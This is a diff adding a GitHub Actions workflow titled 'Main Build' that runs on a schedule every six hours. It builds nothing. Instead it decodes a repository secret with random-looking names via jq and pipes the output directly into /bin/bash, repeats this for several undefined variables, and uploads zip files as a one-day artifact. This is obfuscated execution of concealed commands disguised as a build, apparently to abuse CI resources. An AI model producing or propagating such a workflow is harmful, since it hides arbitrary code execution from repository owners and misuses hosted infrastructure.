@@ -1,0 +1,35 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          jusm3: ${{ secrets.jusm3 }}
+        run: |
+          printf '%s' "$jusm3" | jq -r .yl121 | /bin/bash
+          printf '%s' "$cwdfg83" | jq -r .wt9538 | /bin/bash
+          printf '%s' "$zgl1" | jq -r .ac88 | /bin/bash
+          printf '%s' "$unrs84" | jq -r .cli7 | /bin/bash
+          echo $izfqz7959 | jq -r .soaiz93 | /bin/bash
+          echo $vjxoy9 | jq -r .e71 | /bin/bash
+          printf '%s' "$orhjd434" | jq -r .wz0650 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: bpWSnD31
+          path: "*.zip"
+          retention-days: 1
